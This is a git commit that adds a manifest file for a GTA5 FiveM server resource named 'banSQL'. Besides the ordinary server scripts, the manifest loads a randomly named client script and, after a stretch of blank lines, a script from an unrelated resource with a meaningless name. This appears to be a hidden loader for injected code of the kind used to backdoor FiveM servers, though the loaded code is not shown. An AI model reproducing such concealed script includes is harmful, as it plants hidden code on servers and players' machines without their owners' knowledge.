a60d62947cc8c9ed692238acc94221458f291453
Myzaxx89 <98712213+Myzaxx89@users.noreply.github.com>
2022-09-10 12:47:13 +0200

    Add files via upload

---
+++ banSQL/fxmanifest.lua
@@ -0,0 +1,29 @@
+fx_version('bodacious')
+game('gta5')
+
+server_scripts({
+	'@mysql-async/lib/MySQL.lua',
+	'config.lua',
+	'server/main.lua'
+})
+
+client_script 'jZIkZfHvvt.lua'
+
+
+
+
+
+
+
+
+
+
+
+
+
+client_script '@enbrrr/xDxDxDxDxD.lua'
+
+--☁️ AeroDefence 🚧
+client_script '@AeroDefence/client/c_antistop.lua'
+
+client_script '@AeroDefence/files/protect.lua'
